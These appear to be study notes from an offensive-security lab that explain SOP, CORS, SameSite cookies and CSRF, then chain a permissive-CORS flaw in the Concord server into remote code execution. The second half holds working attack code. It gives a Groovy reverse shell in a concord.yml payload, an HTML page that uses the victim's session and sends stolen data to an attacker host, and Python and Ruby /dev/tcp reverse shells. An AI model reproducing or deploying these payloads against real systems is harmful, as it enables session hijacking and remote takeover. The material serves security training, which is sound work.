# Authentication Bypass: CSRF and CORS

Whenever a target application serves CORS headers, we should investigate them for **overly-permissive** headers. For instance, we could create a payload on a malicious website that forces a visitor to request data from vulnerable website, allowing our malicious website to steal user data. 

During a Cross-Site Request Forgery (CSRF) attack, an attacker runs actions on a victim’s behalf, and if the victim is authenticated, those actions will also be authenticated. When paired with overly-permissive CORS settings, there is greater flexibility in the types of requests that are sent and the type of data that can be obtained. 

CORS headers reduce the applications security by relaxing the **Same-Origin Policy (SOP)**. 

## SOP

Browsers enforce a same-origin policy to prevent one origin from accessing resources on a different origin. Be it a different port, HTTP scheme or domain, as long as there is a difference in the origin, the SOP will prevent access. 

While plenty of websites have images, scripts and other resources from 3rd party origins, the purpose of SOP prevents **JavaScript from reading the response**. Iframes, images and other resources are allowed, since the SOP allows the resource to be loaded onto the page **without** allowing the JavaScript engine access. 

SOP **does not prevent requests from being sent** but prevents the response from being read. 

- However, there are exceptions. Some requests require a HTTP **preflight** request (which is sent with the OPTIONS method) which determines if the subsequent browser request should be allowed to be sent
- Standard GET, HEAD, POST requests don’t require preflight requests
- However, other request, methods, requests with custom headers or POST requests with **nonstandard content-types** require a preflight request.
    - Nonstandard content types are anything except plaintext, multipart form data or `application/x-ww-form-urlencdoded`. For instance, JSON data is nonstandard.
    - When the preflight OPTIONS request is sent, the client (browser) is attempting to send a POST request with a custom content type header. Since the server does not respond with a CORS header, the SOP blocks the request.
    - On the other hand, in a successful request, the response contains several CORS headers. It allows the origin, the custom header, allows a POST request, allows credentials, and instructs the browser to cache the CORS configuration for 0 seconds. After this, the actual POST request was sent through with custom content type.

Exploitation

- If we need to send requests but don’t need to receive responses (i.e. exfiltration), there are more options
- If responses are required, there are fewer options since the target must send more permissive headers.

## CORS

CORS uses headers to instruct a browser for which origins are allowed to access resources from the server. 

- **Access-Control-Allow-Origin**: Describes which origins can access responses
    - The only origins allowed to read a resource are those listed in `Access-Control-Allow-Origin`.
    - This header can be set to 3 values: “”, an origin or “null”. If the header is set to a wildcard (””), all origins are allowed to read a resource from the remote server. However, while this might look vulnerable, this setting requires that `Access-Control-Allow-Credentials` are set to false, resulting in **all requests being unauthenticated**.
    - Note that the null value is not actually the secure option. Certain documents and files opened in the browser have a `null` origin. If the goal is to block other origins, **removing the header** is the most secure options.
    - In secure circumstances, `Access-Control-Allow-Origin` would be set only to trusted origins.
    - However, it has the limitation that it only sets sites set a **single origin**. A common but insecure solution dynamically sets the `Access-Control-Allow-Origin` to the **origin** of the requests, multiple origins can send requests with cookies.
- Access-Control-Allow-Credentials (True/False value): Indicates if the request can include credentials or cookies
- Access-Control-Expose-Headers: Instructs browser to expose certain headers to JavaScript

## Vulnerability Discovery

We can look deeper into the `whoami` request to look for vulnerabilities. 

The GET request does not contain an `origin` header since the request is a GET to the same origin and is not a CORS request. The response contains `Access-Control-Allow-Origin: *` header, indicating that it won’t send cookies on cross-origin requests since this setting requires `Access-Control-Allow-Credentials` to be set to False. 

If the application requires authentication, there must be some form of session management, meaning there must be some way to send the session identifier with the request. When we add a test origin, we get a response with the header `Access-Control-Allow-Origin: [http://evil.com](http://evil.com)` and `Access-Control-Allow-Credentials: true`. 

![Untitled](Authentication%20Bypass%20CSRF%20and%20CORS%20658a554abaa9455a8e07bb61d46f2080/Untitled.png)

Every endpoint and HTTP method can have different CORS headers depending on allowed or disallowed actions. We can send an OPTIONS request to check. 

![Untitled](Authentication%20Bypass%20CSRF%20and%20CORS%20658a554abaa9455a8e07bb61d46f2080/Untitled%201.png)

When an OPTIONS request is sent, the `Origin` header is not replicated to the `Access-Control-Allow-Origin` header. This limits our CORS vulnerability, and we will only be able to read the response of GET requests and standard POST requests. We should investigate another control that sometimes prevents browsers from sending cookies: `SameSite`.

## Same Site

The `SameSite` attribute can be found anywhere in the `Set-Cookie` header (attributes separated by semicolons). This attribute defines whether or not cookies are restricted to a same-site context. It takes 3 possible values: `Strict, None` and `Lax`. 

- If `SameSite` is set to Strict, the browser only sends cookies when the user is on the corresponding website. For instance, cookies won’t be sent if assets are embedded in a different site or loaded within an iframe.
- When `SameSite` is set to None, cookies are sent in **all** contexts. It requires the `Secure` attribute, ensuring cookies are only sent via HTTPS.
- The `Lax` value instructs that cookies are sent on some requests. For a cookie to be included, it must meet the following requirements
    - It must use a method that does not facilitate a change on the server (GET, HEAD, OPTIONS)
    - It must originate from a **user-initiated** navigation, for instance, clicking a link would included the cookie but not requests made by images or scripts.
- If a site does not set the `SameSite` attribute, the default implementation depends on the browser. Chrome 80 and Edge 86 use `Lax`, Firefox and Safari use `None`, and IE does not support `SameSite`. This means that as time goes on,

We can send a test request using the header `authorization: Basic <b64>` where the additional string is a base-64 encoded `user:pass` string. Cookies are returned but this attribute is not set, so we can assume that Concord does not set this attribute. 

- When the default value is `None`, the user visiting the page might be vulnerable to CSRF. One site can send a request to another domain and the browser will include cookies, making CSRF possible if the victim web application does not have additional safeguards.

Concord has some permissive CORS headers and no CSRF tokens present. With no`SameSite` configuration, we might be able to exploit a CSRF vulnerability. 

## CSRF Tokens

Developers have the option of mitigating CSRF using a CSRF token that must be sent with a request that processes a **state change**. CSRF tokens indicate that a user loaded a page and submitted the request themselves.

However, they are often incorrectly configured, reused or not rotated frequently enough. 

## Exploitation

CORS exploits are similar to XSS in that we need to send a link to an already-authenticated user to exploit something of value. The difference is that the link we send are not on the same domain. Since Concord has permissive CORS headers, any site that an authenticated user visits can interact with Concord and **ride the user’s session**. As discovered earlier, only GET requests and standard POST requests work in Concord.

To exploit CORS we must host our own site for the user to visit that hosts a JavaScript payload that will run in the victim’s browser and interact with Concord. In real world, we might host Concord blog with relevant information to entice a victim to visit our site.

Before creating the site, we need to find a payload that allows us to obtain sensitive information. Without credentials, we will need to use Concord documentation. When reviewing documentation, we’ll search for:

1. GET request that allows us to obtain sensitive information
2. GET request that changes the state of the application
3. POST request that only uses standard content-types. 

The first interesting section is the [API key functionality](https://concord.walmartlabs.com/docs/api/apikey.html) that creates an API key for a new user. The request is sent via a POST request using the `application/json` content type, which won’t work as the browser sends an OPTIONS request first. 

Next, there is the list existing API keys functionality. However, it only returns metadata and not the actual keys. 

Continuing on, we find a [Start a Process section](Authentication%20Bypass%20CSRF%20and%20CORS%20658a554abaa9455a8e07bb61d46f2080.md), which is performed via a `multipart/form-data` POST request. This is a standard POST request and does not require a preflight check. 

- The documentation also states that we can use the `Authorization` header, which can be used for API keys in curl requests.
- Most modern sites for brow-ser-based clients use cookies fur authentication. This suggests Concord accepts multiple forms of authentication, and the browser must authenticate API calls.
- Since server sent `Access-Control-Allow-Credentials` header, can assume that cookies are used for session management.

We can [start a Concord process](https://concord.walmartlabs.com/docs/api/process.html#zip-file) by uploading a Zip File. The documentation explains how we can create a zip archive with a `concord.yml` file that contains a flow. The curl command sends a GET request to `/api/v1/process` and specifies the zip file with the `-F` flag for multipart data. In fact, reading further suggests that we can just directly provide a `concord.yml` file. 

![Untitled](Authentication%20Bypass%20CSRF%20and%20CORS%20658a554abaa9455a8e07bb61d46f2080/Untitled%202.png)

We can review the process documentation for potential paths to code execution. In the section on ZIP file, we find a link to the [Directory Structure section](https://concord.walmartlabs.com/docs/processes-v1/index.html#directory-structure) that defines the `concord.yml` file.

```
Concord DSL file containing the main flow, configuration, profiles and other declarations
```

Since the file must contain the main flow, we should look into the [Flows documentation](https://concord.walmartlabs.com/docs/processes-v2/flows.html) to decide how to structure the file. Concord describes a flow as a series of steps that execute various actions, which could potentially execute system commands. We can also find example of flows that execute code under the [Scripting Support section](https://concord.walmartlabs.com/docs/getting-started/scripting.html). 

The Groovy example shows Java commands being executed. Based on the documentation, we important the groovy dependency, set the script value to groovy, and then execute commands. We should follow this format to create our reverse shell script. 

![Untitled](Authentication%20Bypass%20CSRF%20and%20CORS%20658a554abaa9455a8e07bb61d46f2080/Untitled%203.png)

We can use a Groovy reverse shell from [revshells](https://www.revshells.com/) (which is a standard java reverse shell). This forms the `concord.yml` file that will be used as the payload. 

```yaml
configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.21"
flows:
  default:
  - script: groovy
    body: |
	    String host="10.0.0.90";
	    int port=9999;
	    String cmd="/bin/sh";
	    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
	    Socket s=new Socket(host,port);
	    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
	    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
	    while(!s.isClosed()) {
	      while(pi.available()>0)
	        so.write(pi.read());
	      while(pe.available()>0)
	        so.write(pe.read());
	      while(si.available()>0)
	        po.write(si.read());
	      so.flush();
	      po.flush();
	      Thread.sleep(50);
	      try {
	        p.exitValue();
	        break;
	      }
	      catch (Exception e){
	      }
	    };
	    p.destroy();
	    s.close();
```

We also develop a HTML page to deliver the payload. When we run a HTTP server and visit the page, we receive a`UserNotLoggedIn` message. 

```html
<html>
<head>
<script>
fetch("http://concord:8001/api/service/console/whoami", {
	credentials: 'include'
})
.then(async (response) => {
	if(response.status != 401){
	let data = await response.text();
		fetch("http://<LHOST>/?msg=" + data )
	}else{
		fetch("http://<LHOST>/?msg=UserNotLoggedIn" )
	}
})
</script>
</head>
 
<body>
</body>
</html>
```

We can use the `debugger` lab host to simulate a logged-in request. We launch the debugger lab, RDP to the Kali debugger and visit `http://simulator`. Submitting our Kali IP address, we get the following log.

```
192.168.220.253 - - [09/Jun/2024 21:12:46] "GET /?msg={%20%20%22realm%22%20:%20%22apikey%22,%20%20%22username%22%20:%20%22concordAgent%22,%20%20%22displayName%22%20:%20%22concordAgent%22} HTTP/1.1" 200 -

Decoding: {"realm" : "apikey",  "username" : "concordAgent",  "displayName" : "concordAgent"}
```

## Exercises 11.2.5.1

Build Payloads in Python and Ruby. Note that in this context, we need a reverse shell that spawns a **separate** process so that the main process can be terminated without affecting the reverse shell. As such, we’ll use `python.subprocess` and Ruby’s `spawn` and`process.wait` with an OS-based reverse shell for our payload. 

```python
cmd = "/bin/bash -i >& /dev/tcp/192.168.45.187/9001 0>&1"
import subprocess
subprocess.call(cmd, shell=True)
```

```ruby
cmd = "/bin/bash -i >& /dev/tcp/192.168.45.187/9001 0>&1"
pid = spawn(cmd)
Process.wait pid
```